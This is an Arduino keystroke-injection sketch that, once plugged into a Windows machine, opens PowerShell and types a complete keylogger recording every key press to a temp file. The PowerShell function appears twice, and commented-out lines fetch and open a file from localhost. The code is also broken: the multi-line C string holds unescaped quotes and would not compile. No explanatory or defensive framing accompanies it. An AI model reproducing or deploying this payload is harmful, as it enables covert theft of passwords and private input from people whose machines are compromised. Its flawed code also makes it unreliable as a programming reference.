#include <Keyboard.h>

#define KEY_LEFT_CTRL 0x80
#define KEY_LEFT_SHIFT 0x81
#define KEY_LEFT_ALT  0x82
#define KEY_LEFT_GUI  0x83
#define KEY_RIGHT_CTRL  0x84
#define KEY_RIGHT_SHIFT   0x85
#define KEY_RIGHT_ALT   0x86
#define KEY_RIGHT_GUI   0x87
#define KEY_UP_ARROW  0xDA
#define KEY_DOWN_ARROW  0xD9
#define KEY_LEFT_ARROW  0xD8
#define KEY_RIGHT_ARROW   0xD7
#define KEY_BACKSPACE   0xB2
#define KEY_TAB   0xB3
#define KEY_RETURN  0xB0
#define KEY_ESC   0xB1
#define KEY_INSERT  0xD1
#define KEY_DELETE  0xD4
#define KEY_PAGE_UP   0xD3
#define KEY_PAGE_DOWN   0xD6
#define KEY_HOME  0xD2
#define KEY_END   0xD5
#define KEY_CAPS_LOCK   0xC1
#define KEY_F1  0xC2
#define KEY_F2  0xC3
#define KEY_F3  0xC4
#define KEY_F4  0xC5
#define KEY_F5  0xC6
#define KEY_F6  0xC7
#define KEY_F7  0xC8
#define KEY_F8  0xC9
#define KEY_F9  0xCA
#define KEY_F10   0xCB
#define KEY_F11   0xCC
#define KEY_F12   0xCD

void setup() {
  Keyboard.begin();

  delay(500);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("powershell");
  delay(100);
  Keyboard.print("function Start-KeyLogger($Path="$env: temp\keylogger.txt")
                 {
                 $signatures = @'
                 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
                 public static extern short GetAsyncKeyState(int virtualKeyCode);
                 [DllImport("user32.dll", CharSet=CharSet.Auto)]
                 public static extern int GetKeyboardState(byte[] keystate);
                 [DllImport("user32.dll", CharSet=CharSet.Auto)]
                 public static extern int MapVirtualKey(uint uCode, int uMapType);
                 [DllImport("user32.dll", CharSet=CharSet.Auto)]
                 public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
                 '@
                 $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
                 $null = New-Item -Path $Path -ItemType File -Force
                 try
                 {
                 Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red
                 while ($true) {
                 Start-Sleep -Milliseconds 40
                 for ($ascii = 9; $ascii -le 254; $ascii++) {
                 $state = $API::GetAsyncKeyState($ascii)
                 if ($state -eq -32767) {
                 $null = [console]::CapsLock
                 $virtualKey = $API::MapVirtualKey($ascii, 3)
                 $kbstate = New-Object Byte[] 256
                 $checkkbstate = $API::GetKeyboardState($kbstate)
                 $mychar = New-Object -TypeName System.Text.StringBuilder
                 $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
                 if ($success)
                 {
                 [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
               }
               }
               }
               }
               }
                 finally
                 {
                 notepad $Path
               }
               }function Start-KeyLogger($Path="$env: temp\keylogger.txt")
                 {
                 $signatures = @'
                 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
                 public static extern short GetAsyncKeyState(int virtualKeyCode);
                 [DllImport("user32.dll", CharSet=CharSet.Auto)]
                 public static extern int GetKeyboardState(byte[] keystate);
                 [DllImport("user32.dll", CharSet=CharSet.Auto)]
                 public static extern int MapVirtualKey(uint uCode, int uMapType);
                 [DllImport("user32.dll", CharSet=CharSet.Auto)]
                 public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
                 '@
                 $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
                 $null = New-Item -Path $Path -ItemType File -Force
                 try
                 {
                 Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red
                 while ($true) {
                 Start-Sleep -Milliseconds 40
                 for ($ascii = 9; $ascii -le 254; $ascii++) {
                 $state = $API::GetAsyncKeyState($ascii)
                 if ($state -eq -32767) {
                 $null = [console]::CapsLock
                 $virtualKey = $API::MapVirtualKey($ascii, 3)
                 $kbstate = New-Object Byte[] 256
                 $checkkbstate = $API::GetKeyboardState($kbstate)
                 $mychar = New-Object -TypeName System.Text.StringBuilder
                 $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
                 if ($success)
                 {
                 [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
               }
               }
               }
               }
               }
                 finally
                 {
                 notepad $Path
               }
               }
                 Start-KeyLogger");
  /*Keyboard.println("*New/Object System.Net.WebClient(.DownloadFile*@http>&&localhost&CodePNG.png@, @$*$Env>userprofile(&Desktop&CodePNG.png@(");
    Keyboard.println("Invoke/item $Env>userprofile&Desktop&CodePNG.png");*/
  /*Keyboard.println("(New-Object System.Net.WebClient).DownloadFile(\"http://localhost/CodePNG.png\", \"$($Env:userprofile)/Desktop/CodePNG.png\")");
    Keyboard.println("Invoke-item $Env:userprofile/Desktop/CodePNG.png"); */
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {

}
